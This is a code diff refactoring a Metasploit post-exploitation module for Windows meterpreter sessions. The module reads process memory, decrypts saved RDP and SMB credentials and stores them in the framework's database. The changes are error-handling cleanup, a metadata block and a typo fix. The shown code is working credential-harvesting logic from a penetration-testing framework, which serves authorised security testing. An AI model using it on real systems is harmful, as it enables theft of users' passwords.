@@ -20,6 +20,11 @@ class MetasploitModule < Msf::Post
         'Platform' => ['win'],
         'SessionTypes' => ['meterpreter'],
         'Author' => ['Kx499'],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -67,21 +72,22 @@ class MetasploitModule < Msf::Post
   end
 
   def read_str(address, len, type)
-    begin
-      pid = session.sys.process.open.pid
-      process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
-      raw = process.memory.read(address, len)
-      if type == 0 # unicode
-        str_data = raw.gsub("\x00", '')
-      elsif type == 1 # null terminated
-        str_data = raw.unpack('Z*')[0]
-      elsif type == 2 # raw data
-        str_data = raw
-      end
-    rescue StandardError
+    pid = session.sys.process.open.pid
+    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
+    raw = process.memory.read(address, len)
+    if type == 0 # unicode
+      str_data = raw.gsub("\x00", '')
+    elsif type == 1 # null terminated
+      str_data = raw.unpack('Z*')[0]
+    elsif type == 2 # raw data
+      str_data = raw
+    else
       str_data = nil
     end
+
     return str_data || 'Error Decrypting'
+  rescue StandardError
+    return 'Error Decrypting'
   end
 
   def decrypt_blob(daddr, dlen, type)
@@ -132,59 +138,55 @@ class MetasploitModule < Msf::Post
   end
 
   def report_db(cred)
-    ip_add = nil
     host = ''
     port = 0
-    begin
-      if cred['targetname'].include? 'TERMSRV'
-        host = cred['targetname'].gsub('TERMSRV/', '')
-        port = 3389
-        service = 'rdp'
-      elsif cred['type'] == 2
-        host = cred['targetname']
-        port = 445
-        service = 'smb'
-      else
-        return false
-      end
 
-      ip_add = gethost(host)
-
-      if ip_add.nil?
-        return
-      else
-        service_data = {
-          address: ip_add,
-          port: port,
-          protocol: 'tcp',
-          service_name: service,
-          workspace_id: myworkspace_id
-        }
-
-        credential_data = {
-          origin_type: :session,
-          session_id: session_db_id,
-          post_reference_name: refname,
-          username: cred['username'],
-          private_data: cred['password'],
-          private_type: :password
-        }
-
-        credential_core = create_credential(credential_data.merge(service_data))
-
-        login_data = {
-          core: credential_core,
-          access_level: 'User',
-          status: Metasploit::Model::Login::Status::UNTRIED
-        }
-
-        create_credential_login(login_data.merge(service_data))
-        print_status("Credentials for #{ip_add} added to db")
-      end
-    rescue ::Exception => e
-      print_error("Error adding credential to database for #{cred['targetname']}")
-      print_error(e.to_s)
+    if cred['targetname'].include? 'TERMSRV'
+      host = cred['targetname'].gsub('TERMSRV/', '')
+      port = 3389
+      service = 'rdp'
+    elsif cred['type'] == 2
+      host = cred['targetname']
+      port = 445
+      service = 'smb'
+    else
+      return false
     end
+
+    ip_add = gethost(host)
+
+    return if ip_add.nil?
+
+    service_data = {
+      address: ip_add,
+      port: port,
+      protocol: 'tcp',
+      service_name: service,
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :session,
+      session_id: session_db_id,
+      post_reference_name: refname,
+      username: cred['username'],
+      private_data: cred['password'],
+      private_type: :password
+    }
+
+    credential_core = create_credential(credential_data.merge(service_data))
+
+    login_data = {
+      core: credential_core,
+      access_level: 'User',
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }
+
+    create_credential_login(login_data.merge(service_data))
+    print_status("Credentials for #{ip_add} added to db")
+  rescue StandardError => e
+    print_error("Error adding credential to database for #{cred['targetname']}")
+    print_error(e.to_s)
   end
 
   def get_creds
@@ -260,7 +262,7 @@ class MetasploitModule < Msf::Post
 
         # only add to array if there is a target name
         unless (cred['targetname'] == 'Error Decrypting') || (cred['password'] == 'unsupported type')
-          print_status("Credential sucessfully decrypted for: #{cred['targetname']}")
+          print_status("Credential successfully decrypted for: #{cred['targetname']}")
           credentials << cred
         end
       end
